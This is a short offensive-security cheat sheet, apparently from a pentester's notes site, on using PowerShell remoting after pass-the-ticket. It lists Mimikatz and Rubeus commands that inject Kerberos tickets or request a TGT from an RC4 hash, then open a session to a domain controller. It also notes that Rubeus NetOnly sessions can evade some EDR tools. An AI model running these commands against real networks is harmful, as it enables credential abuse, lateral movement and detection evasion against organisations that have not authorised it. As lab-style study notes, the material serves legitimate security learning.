# Powershell Remoting

## <mark style="color:yellow;">ABOUT</mark>

<mark style="color:red;">**PowerShell remoting**</mark> is a feature that allows users to run **PowerShell** commands or scripts on remote computers. It's built on the **WinRM** service

### <mark style="color:blue;">Mimikatz</mark>

```powershell
kerberos::ptt "C:\Users\venator17\Desktop\Mimikatz\[0;7f830]-5-2-43f10000-venator17@krbtgt-amogus.kek.kirbi"
Enter-PSSession -ComputerName DC01
```

### <mark style="color:blue;">**Rubeus**</mark>

```powershell
Rubeus.exe asktgt /domain:amogus.kek /user:venator17 /rc4:1293uo1uwfoi1hw081 /ptt
Enter-PSSession -ComputerName DC01
```

### <mark style="color:blue;">Rubeus NetOnly Session</mark>

We can use <mark style="color:green;">**createnetonly**</mark> options to make NetOnly session, which don't have access for local machine, but could access services. Later we could use Rubeus <mark style="color:red;">**/ptt**</mark> command to insert **TGT. NetOnly** sessions are less detectable and could evade some **EDR's**.

```powershell
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
